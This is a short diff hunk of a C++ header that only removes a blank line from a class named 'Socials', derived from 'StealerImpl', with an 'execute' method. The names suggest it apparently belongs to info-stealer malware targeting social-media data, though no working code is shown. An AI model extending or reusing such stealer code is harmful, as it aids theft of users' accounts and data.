@@ -10,7 +10,6 @@
 class Socials : public StealerImpl {
 public:
     Socials();
-
     void execute(fs::path& root) override;
 
 private:
